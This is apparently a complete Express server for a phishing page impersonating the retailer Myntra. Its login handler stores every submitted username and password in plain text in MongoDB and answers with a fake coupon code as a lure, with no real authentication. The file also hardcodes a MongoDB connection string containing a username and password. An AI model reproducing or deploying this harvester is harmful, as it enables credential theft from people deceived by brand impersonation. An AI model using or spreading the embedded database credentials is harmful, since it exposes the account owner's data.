const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const app = express();

// MongoDB connection (replace with your credentials)
mongoose.connect('mongodb+srv://malgayanikhil321:nikhilmalgaya321@cluster1.yopgy.mongodb.net/login2', {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => console.log('Connected to MongoDB'))
  .catch(error => console.error('MongoDB connection error:', error));

// Define a User schema
const userSchema = new mongoose.Schema({
    username: { type: String },
    password: { type: String }
});

const User = mongoose.model('User', userSchema);

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Coupon codes
const couponCodes = ["MYNTRA10", "FASHION20", "STYLE30", "WINTER50", "SUMMER15"];

// Handle POST request from the login form
app.post('/login', async (req, res) => {
    const { u_name, pass } = req.body;

    try {
        const user = new User({ username: u_name, password: pass });
        await user.save();

        // Select a random coupon code
        const randomCoupon = couponCodes[Math.floor(Math.random() * couponCodes.length)];
        res.send(`Hyy ${u_name} Your Myntra coupon code is: ${randomCoupon}`);
    } catch (error) {
        console.error('Error saving login:', error);
        res.status(500).send('Failed to save login');
    }
});

const PORT = process.env.PORT || 5500;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
